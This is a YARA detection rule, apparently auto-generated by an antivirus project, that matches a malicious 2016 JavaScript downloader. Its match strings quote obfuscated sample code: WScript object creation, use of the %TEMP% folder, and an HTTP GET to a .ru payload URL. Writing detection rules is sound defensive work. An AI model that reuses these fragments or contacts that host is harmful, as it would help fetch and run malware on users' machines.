rule sig_20160428_089dfddae3d5e57cce755bb79599d358 {
  meta:
    description = "datamaliciousorder - file 20160428_089dfddae3d5e57cce755bb79599d358.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d127edd9d8ee37fe388cd3165f202b92d43c396b83a0b77daa20baeb3ffc890f"

  strings:
    $s1  = "function UceDxmLgsEqyLnlPpeSoy(XdiZkiTkkMblFbvFzbCnm){NluDnxMorWakRccWzsKeu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function DrpGwpIfdBpcWsiBsdAcb() {return NluDnxMorWakRccWzsKeu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function UceDxmLgsEqyLnlPpeSoy(XdiZkiTkkMblFbvFzbCnm){NluDnxMorWakRccWzsKeu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return VmwOtwKljQnsTvxQiiVoi - OraCypOcbQwrVquRcrQbx;};" fullword ascii
    $s5  = "function BfiWloTnxSdfPdrFmgXqt(VmwOtwKljQnsTvxQiiVoi, OraCypOcbQwrVquRcrQbx){AwbSmoWorJfyVrxOjkBnc = AwbSmoWorJfyVrxOjkBnc * 1; " ascii
    $s6  = "var NluDnxMorWakRccWzsKeu = function SexYatUejFmmFcfGvmMie() {return UnoYieFxhRasGlsBjvQlq[LzfJwpDnhRekEcfSoyFon](\"WScript\"+\"" ascii
    $s7  = "UxvGizMtjCqvJzpOqqCeb[QbrRwoDefVmyLjsLchAhf](\"G\" + \"ET\", \"http://3dphoto-rotate.ru/h4ydjs\", false);" fullword ascii
    $s8  = "var UnoYieFxhRasGlsBjvQlq = this[\"WScript\"];" fullword ascii
    $s9  = "var NluDnxMorWakRccWzsKeu = function SexYatUejFmmFcfGvmMie() {return UnoYieFxhRasGlsBjvQlq[LzfJwpDnhRekEcfSoyFon](\"WScript\"+\"" ascii
    $s10 = "function DrpGwpIfdBpcWsiBsdAcb() {return NluDnxMorWakRccWzsKeu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (UxvGizMtjCqvJzpOqqCeb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function BfiWloTnxSdfPdrFmgXqt(VmwOtwKljQnsTvxQiiVoi, OraCypOcbQwrVquRcrQbx){AwbSmoWorJfyVrxOjkBnc = AwbSmoWorJfyVrxOjkBnc * 1; " ascii
    $s13 = "function WbmTbwQjaLtnXrcLcwBvk() {return ((MhyOxbGnwDinHudKfsBxa == true) && (MhyOxbGnwDinHudKfsBxa == PmbWcqFrkTpqKvaBteIms)) ?" ascii
    $s14 = "function WbmTbwQjaLtnXrcLcwBvk() {return ((MhyOxbGnwDinHudKfsBxa == true) && (MhyOxbGnwDinHudKfsBxa == PmbWcqFrkTpqKvaBteIms)) ?" ascii
    $s15 = "return BfiWloTnxSdfPdrFmgXqt(1 == 1 ? UdwQzgNlrNevKamBtcLoc : 0, 1 == 1 ? NssSjbKnpUaiWjyAqiEco : 0);" fullword ascii
    $s16 = "function EbyNjkYoxProHmqUhhNai()" fullword ascii
    $s17 = "}while (PnyUhySjiSuzJotFmbSiq);" fullword ascii
    $s18 = "var FokMtaPwqHnfRpvIilYnb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "var GavYryPuxNlxIcwCwjAdw = false;" fullword ascii
    $s20 = "PmbWcqFrkTpqKvaBteIms = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}